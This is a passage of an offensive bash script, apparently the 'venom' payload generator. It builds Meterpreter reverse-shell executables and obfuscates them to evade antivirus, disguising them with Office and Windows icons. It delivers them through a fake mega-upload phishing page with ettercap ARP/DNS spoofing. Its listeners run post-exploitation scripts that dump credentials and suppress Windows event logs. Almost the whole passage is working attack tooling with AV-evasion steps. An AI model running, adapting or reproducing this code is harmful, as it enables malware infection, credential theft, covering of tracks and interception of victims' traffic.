        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else


  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# -----------------------------------------------------
# C - PYTHON to EXE shellcode (SSL/TLS eavesdrop)
# ------------------------------------------------------
sh_shellcode23 () {
# run module or abort ? 
QuE=$(zenity --question --title="☠ UUID random keys evasion ☠" --text "Author: r00t-3xp10it | null-byte\nAdding ramdom comments into sourcecode\nwill help evading AVs signature detection (@nullbite)\n'a computer can never outsmart a always changing virus'\n\nRun uuid module?" --width 370) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 260) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: SSLbinary" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="SSLbinary";fi

echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
sleep 1
echo "[☠] Building shellcode -> C,SSL/TLS format .."
sleep 2
echo "[☠] meterpreter over SSL sellected .."
sleep 1
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : C,SSL/TLS -> WINDOWS(EXE)
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
# https://nodistribute.com/result/0DGFYgWdtaKuv8NzMiqAwJIQfmBy (2/39) py raw
# https://nodistribute.com/result/BunD148C79GOQkxj0g2deHqI (3/39) py exe
# https://nodistribute.com/result/LDynoZOq9A5TeBMYFW4k (2/39) nullbite obfuscation
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --smallest -f c | tr -d '\"' | tr -d '\n' | more > $IPATH/output/chars.raw"


echo ""
# strip bad caracters and store shellcode 
store=`cat $IPATH/output/chars.raw | awk {'print $5'} | cut -d ';' -f1`
# display generated code
cat $IPATH/output/chars.raw
echo "" && echo "" && echo ""
sleep 2


   # check if chars.raw as generated
   if [ -e "$IPATH/output/chars.raw" ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


#
# Template ramdom keys ..
# HINT: adding ramdom comments to sourcecode
# will help evading AVs signature detection (nullbite) 
# "a computer can never outsmart a always changing virus" 
#
NEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
#
# pyinstaller does not accept numbers in funtion names (compiling), so we use only leters ..
#
NEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
NEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 11 | head -n 1)
NEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 12 | head -n 1)


#
# Build python Template (random UUID keys)
#
cd $IPATH/output
echo "[☠] build -> template.py"
sleep 1
echo "[✔] Using random UUID keys (evade signature detection)"
sleep 1
#
# display generated keys to user
#
echo ""
echo "    Generated key:$NEW_UUID_3"
sleep 1
echo "    Generated key:$NEW_UUID_4"
sleep 1
echo "    Generated key:$NEW_UUID_5"
sleep 1
echo "    Generated key:$NEW_UUID_1"
sleep 1
echo "    Generated key:$NEW_UUID_2"
sleep 1
echo ""
sleep 1



echo "#!/usr/bin/python" > template.py
echo "# -*- coding: utf-8 -*-" >> template.py
echo "# $NEW_UUID_1" >> template.py
echo "from ctypes import *" >> template.py
echo "# $NEW_UUID_2" >> template.py
echo "$NEW_UUID_3 = (\"$store\");" >> template.py
echo "# gdGtdfASsTmFFsGbaaUnaDtaAvAaTkDKsHFdtGaAGmDoTkEkoT" >> template.py
echo "$NEW_UUID_4 = create_string_buffer($NEW_UUID_4, len($NEW_UUID_4))" >> template.py
echo "# GSMsdMfhmDjkGjDhMhhMfdsAsasAffWgUkhWWjWjGfdOgEEjue" >> template.py
echo "$NEW_UUID_5 = cast($NEW_UUID_5, CFUNCTYPE(c_void_p))" >> template.py
echo "# HdFDgFDttPkSMcSsFSKaWdBfDBmkSkOSiBewSDoFtLmDeWsKvG" >> template.py
echo "$NEW_UUID_5()" >> template.py
sleep 2

     # check if pyinstaller its installed
     if [ -d $DrIvC/$PiWiN ]; then
       # compile python to exe
       echo "[☠] pyinstaller -> found!"
       sleep 2
       echo "[☠] compile template.py -> $N4m.exe"
       sleep 2
       cd $IPATH/output

# chose executable final icon (.ico)
iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1

       #
       # pyinstaller backend appl
       #
       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/template.py'"
       cp $IPATH/output/dist/template.exe $IPATH/output/$N4m.exe
       rm $IPATH/output/*.spec > /dev/null 2>&1
       rm $IPATH/output/*.log > /dev/null 2>&1
       rm -r $IPATH/output/dist > /dev/null 2>&1
       rm -r $IPATH/output/build > /dev/null 2>&1
     else
      echo "[☠] pyinstaller not found .."
      exit
     fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ------------------------------
# C - AVET to EXE shellcode  FUD 
# ------------------------------
sh_shellcode24 () {
# run module or abort ? 
QuE=$(zenity --question --title="☠ AVET AV evasion ☠" --text "Author: Daniel Sauder\nThis module uses AVET to obfuscate\nthe sourcecode (evade AV detection)\n\nRun avet module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
#
# Check if dependencies are installed ..
# check if MinGw EXE exists ..
#
which mingw-gcc > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo "[☠] MinGw EXE compiler found .."
  sleep 2
else
  echo "[x] MinGw EXE compiler not found .."
  sleep 2
    #
    # check if files/directory exist ..
    #
    if [ -e "/usr/bin/mingw-gcc" ]; then
      rm /usr/bin/mingw-gcc > /dev/null 2>&1
    fi
    if [ -d "$DrIvC/MinGW" ]; then
      rm -r $DrIvC/MinGW > /dev/null 2>&1
    fi
    echo "[☠] Installing MinGw EXE compiler .."
    cd $IPATH/obfuscate/
    xterm -T "Donwloading MinGw EXE compiller" -geometry 124x26 -e "wget https://downloads.sourceforge.net/project/mingw/Installer/mingw-get-setup.exe"
    xterm -T "Installing MinGw EXE compiller" -geometry 124x26 -e "$arch mingw-get-setup.exe"
  #
  # Building minGW diectory ..
  #
  echo "#!/bin/sh" >> /usr/bin/mingw-gcc
  echo "cd $DrIvC/MinGW/bin" >> /usr/bin/mingw-gcc
  echo "exec wine gcc.exe \"\$@\"" >> /usr/bin/mingw-gcc
  chmod +x /usr/bin/mingw-gcc
  echo "[✔] Done installing MinGW .."
  rm mingw-get-setup.exe > /dev/null 2>&1
  cd $IPATH/
  sleep 2
fi
#
# Install avet obfuscated software ..
#
if [ -e "$IPATH/obfuscate/avet/make_avet" ]; then
  echo "[☠] avet obfuscator found .."
  sleep 2
else
  echo "[x] avet obfuscator not found .."
  sleep 2
  echo "[☠] Installing avet software .."
  sleep 1
    #
    # build avet ..
    #
    if [ -d $IPATH/obfuscate/avet ]; then
      rm -r $IPATH/obfuscate/avet > /dev/null 2>&1
    fi
    cd $IPATH/obfuscate/
    xterm -T "Installing avet software" -geometry 124x26 -e "git clone https://github.com/govolution/avet.git && sleep 2"
  #
  # Build avet files ..
  #
  cd $IPATH/obfuscate/avet
  gcc make_avet.c -o make_avet
  gcc sh_format.c -o sh_format
  echo "[✔] Done installing avet .."
  sleep 2
  cd $IPATH/
fi


#
# Get user input to build shellcode ..
#
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
interactions=$(zenity --title="☠ Enter ENCODER interactions ☠" --text "example: 3" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 290) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: AvetPayload" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="AvetPayload";fi
if [ -z "$interactions" ]; then interactions="3";fi

echo "[☠] Building shellcode -> C format .."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : C -> WINDOWS(EXE)
    |_PAYLOAD : $paylo

!
#
# Use metasploit to build shellcode (msf encoded)
# https://nodistribute.com/result/YCHgomiEkJrI3BcbtjvGsuexKVp842 (3/39) with -i 3
# https://nodistribute.com/result/ENZ1b6R2TrYocWHCzy9fwMuQs (0/39) FUD with -F -E
#
  if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
    xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c -o $IPATH/obfuscate/avet/template.txt"
  else
    xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i $interactions -f c -o $IPATH/obfuscate/avet/template.txt"
  fi

echo ""
# display generated code
cat $IPATH/obfuscate/avet/template.txt
echo "" && echo ""
sleep 2


# EDITING/BACKUP FILES NEEDED
echo "[☠] Editing/backup files .."
sleep 2


#
# We can reuse the template.txt from the previous example for decoding the shellcode:
#
echo "[☠] Decoding shellcode with avet .."
sleep 2
cd $IPATH/obfuscate/avet
if [ -e "$IPATH/obfuscate/avet/defs.h" ]; then
  rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1
fi
#
# (decoding/obfuscation)
#
xterm -T "DECODING/OBFUSCATING SOURCECODE" -geometry 110x20 -e "./format.sh template.txt > scclean.txt && sleep 2"
rm $IPATH/obfuscate/avet/template.txt
mv scclean.txt template.txt
echo "[☠] Obfuscating shellcode with avet .."
sleep 1

  if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
    ./make_avet -f template.txt -X -F -E
  else
    ./make_avet -f template.txt -F -E
  fi
echo "[☠] Compiling shellcode to exe .."
sleep 2
# gcc $IPATH/obfuscate/avet/avet.c -o $IPATH/output/$N4m.exe
sudo mingw-gcc -o $IPATH/output/$N4m.exe $IPATH/obfuscate/avet/avet.c
cd $IPATH/
sleep 2


#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
